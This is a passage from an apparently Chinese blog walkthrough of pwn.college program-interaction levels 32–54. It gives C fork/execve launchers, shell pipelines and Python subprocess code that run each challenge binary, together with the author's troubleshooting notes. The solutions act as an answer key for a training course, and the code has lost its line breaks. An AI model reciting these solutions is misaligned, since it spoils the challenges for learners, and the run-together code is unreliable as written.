class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level32"><a class="markdownIt-Anchor" href="#level32"></a> level32</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token keyword">void</span> <span class="token function">pwncollege</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>newargv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"embryoio_level32"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>newenv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"rnzara=mtqxpnweqm"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/challenge/embryoio_level32"</span><span class="token punctuation">,</span>newargv<span class="token punctuation">,</span>newenv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> fpid<span class="token punctuation">;</span>    fpid<span class="token operator">=</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error in fork!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im child!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">pwncollege</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fpid<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im Parent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level33"><a class="markdownIt-Anchor" href="#level33"></a> level33</h3><p>输入流重定向</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token keyword">void</span> <span class="token function">pwncollege</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>newargv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"embryoio_level33"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>newenv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/challenge/embryoio_level33"</span><span class="token punctuation">,</span>newargv<span class="token punctuation">,</span>newenv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> fpid<span class="token punctuation">;</span>    fpid<span class="token operator">=</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error in fork!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">freopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/aoztam"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im child!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">pwncollege</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fpid<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im Parent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level34"><a class="markdownIt-Anchor" href="#level34"></a> level34</h3><p>输出流重定向</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token keyword">void</span> <span class="token function">pwncollege</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>newargv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"embryoio_level34"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>newenv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token constant">NULL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/challenge/embryoio_level34"</span><span class="token punctuation">,</span>newargv<span class="token punctuation">,</span>newenv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>env<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">pid_t</span> fpid<span class="token punctuation">;</span>    fpid<span class="token operator">=</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error in fork!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>fpid<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">freopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/ivyyzs"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im child!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">pwncollege</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fpid<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Im Parent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level35"><a class="markdownIt-Anchor" href="#level35"></a> level35</h3><p>设置空环境变量，不重复贴了</p><h3 id="level36"><a class="markdownIt-Anchor" href="#level36"></a> level36</h3><pre class="line-numbers language-none"><code class="language-none">- the challenge checks for a specific parent process : bash- the challenge checks for a specific process at the other end of stdout : cat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么我们之间bash执行， 将stdout 输送到 cat即可</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;embryoio_level36 | cat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level37"><a class="markdownIt-Anchor" href="#level37"></a> level37</h3><p>这里有个坑，因为我用的vscode ，默认是<code>dash</code></p><p>需要手动输入<code>bash</code>切换到<code>bash</code>然后才能通过检查</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;embryoio_level37 | grep &quot;pwn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level38"><a class="markdownIt-Anchor" href="#level38"></a> level38</h3><p>复习一下<code>sed</code></p><ol><li><strong>替换文本</strong>：<ul><li><code>s/old/new/</code>：将行中的第一个匹配的 <code>old</code> 替换为 <code>new</code>。</li><li><code>s/old/new/g</code>：将行中所有匹配的 <code>old</code> 替换为 <code>new</code>。</li><li><code>s/old/new/2</code>：将行中第二个匹配的 <code>old</code> 替换为 <code>new</code>。</li></ul></li><li><strong>删除行</strong>：<ul><li><code>d</code>：删除匹配的行。</li><li><code>1d</code>：删除第一行。</li><li><code>2,5d</code>：删除第二到第五行。</li></ul></li><li><strong>插入和追加文本</strong>：<ul><li><code>i\text</code>：在匹配行前插入文本。</li><li><code>a\text</code>：在匹配行后追加文本。</li></ul></li><li><strong>打印文本</strong>：<ul><li><code>p</code>：打印匹配的行。</li></ul></li><li><strong>行的选择</strong>：<ul><li><code>5p</code>：打印第五行。</li><li><code>1,5p</code>：打印第一到第五行。</li></ul></li><li><strong>执行文件中的命令</strong>：<ul><li><code>-f scriptfile</code>：从指定文件中读取 <code>sed</code> 命令并执行。</li></ul></li><li><strong>编辑标记</strong>：<ul><li><code>b label</code>：跳转到标记 <code>label</code>。</li><li><code>t label</code>：如果有替换，则跳转到标记 <code>label</code>。</li></ul></li><li><strong>行号</strong>：<ul><li><code>=</code>：打印行号。</li><li><code>N</code>：将下一行添加到模式空间。</li></ul></li><li><strong>模式匹配</strong>：<ul><li><code>^</code>：匹配行的开头。</li><li><code>$</code>：匹配行的结尾。</li><li><code>.</code>：匹配任意单个字符。</li><li><code>*</code>：匹配零个或多个前面的元素。</li></ul></li><li><strong>其他命令</strong>：<ul><li><code>q</code>：退出 <code>sed</code>。</li></ul></li></ol><pre class="line-numbers language-none"><code class="language-none">.&#x2F;embryoio_level38 | sed &quot;p&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level39"><a class="markdownIt-Anchor" href="#level39"></a> level39</h3><pre class="line-numbers language-none"><code class="language-none">.&#x2F;embryoio_level39 | rev |rev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level40"><a class="markdownIt-Anchor" href="#level40"></a> level40</h3><pre class="line-numbers language-none"><code class="language-none">cat | .&#x2F;embryoio_level40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level41"><a class="markdownIt-Anchor" href="#level41"></a> level41</h3><p>有点sb?</p><p>没懂什么原理</p><p>开始使用<code>rev | ./embryoio_level41</code>输入后没反应</p><p><a href="https://discord.com/channels/750635557666816031/1193136623169310731/threads/1214880613790777365">• Discord | #program-interaction | pwn.college</a></p><p>发现很多人和我一个问题，在vscode里面的终端搞就不太行</p><p>这里有详细的讨论</p><p>原因大概是因为<code>rev</code>不会处理<code>\n</code>,需要我们手动输入<code>ctrl+D</code>发生<code>EOF</code>信号</p><p>这样就解决了</p><h3 id="level42"><a class="markdownIt-Anchor" href="#level42"></a> level42</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./embryoio_level42 <span class="token operator">|</span> <span class="token function">cat</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后<code>bash 1.sh</code>执行这个脚本,又是一遍轮回</p><h3 id="level43"><a class="markdownIt-Anchor" href="#level43"></a> level43</h3><pre class="line-numbers language-none"><code class="language-none">.&#x2F;embryoio_level43 | grep &quot;pwn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level44"><a class="markdownIt-Anchor" href="#level44"></a> level44</h3><pre class="line-numbers language-none"><code class="language-none">.&#x2F;embryoio_level44 | sed &quot;p&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level45"><a class="markdownIt-Anchor" href="#level45"></a> level45</h3><pre class="line-numbers language-none"><code class="language-none">.&#x2F;embryoio_level45 | rev | rev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level46"><a class="markdownIt-Anchor" href="#level46"></a> level46</h3><pre class="line-numbers language-none"><code class="language-none">cat | .&#x2F;embryoio_level46<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level47"><a class="markdownIt-Anchor" href="#level47"></a> level47</h3><pre class="line-numbers language-none"><code class="language-none">rev|rev | .&#x2F;embryoio_level47<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>记得输入<code>ctrl + D</code></p><h3 id="level48"><a class="markdownIt-Anchor" href="#level48"></a> level48</h3><p>根据提示，可以使用<code>subprocess</code>也可以使用<code>pwntools</code></p><p><code>subprocess</code>只能使用<code>popen</code>因为<code>run</code>的区别在于</p><p><code>subprocess.Popen</code> 和 <code>subprocess.run</code> 都是 Python 中用于执行外部命令的模块。它们之间的主要区别在于：</p><ol><li><strong>返回值</strong>：<ul><li><code>subprocess.Popen</code> 返回一个 Popen 对象，该对象表示正在运行的子进程。你可以使用该对象的方法来与子进程进行交互，例如等待其完成或发送输入。</li><li><code>subprocess.run</code> 返回一个 CompletedProcess 对象，该对象包含有关运行命令的信息，如返回码、标准输出和标准错误</li></ul></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level48"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>异或??</p><p>我阅读了<code>pwntools</code>的文档，我认为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 启动一个子进程执行命令，并将输出重定向到一个管道</span>p1 <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/embryoio_level48"</span><span class="token punctuation">)</span><span class="token comment"># 使用cat命令读取子进程的输出</span>p2 <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span><span class="token comment"># 读取cat命令的输出</span>output <span class="token operator">=</span> p2<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 打印输出</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为什么不行呢</p><p><s>心态爆炸了</s></p><p>研究一波<code>pwntools</code></p><p><a href="https://blog.csdn.net/kelxLZ/article/details/123152529">Pwntools 2022简明手册_pwntools手册-CSDN博客</a></p><p><a href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">pwntools-cheatsheet.md (github.com)</a></p><h3 id="level49"><a class="markdownIt-Anchor" href="#level49"></a> level49</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level49"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"grep"</span><span class="token punctuation">,</span><span class="token string">"pwn"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level50"><a class="markdownIt-Anchor" href="#level50"></a> level50</h3><p>在Ipython中运行</p><h3 id="level51"><a class="markdownIt-Anchor" href="#level51"></a> level51</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level51"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"rev"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"rev"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>p2<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level52"><a class="markdownIt-Anchor" href="#level52"></a> level52</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level52"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level53"><a class="markdownIt-Anchor" href="#level53"></a> level53</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"rev"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"rev"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level53"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入密码后记得<code>ctrl+D</code>发生<code>fd</code>标识</p><h3 id="level54"><a class="markdownIt-Anchor" href="#level54"></a> level54</h3><p>用python执行刚才的脚本又是一遍轮回 我觉得可以精简一下</p> <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level54"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token 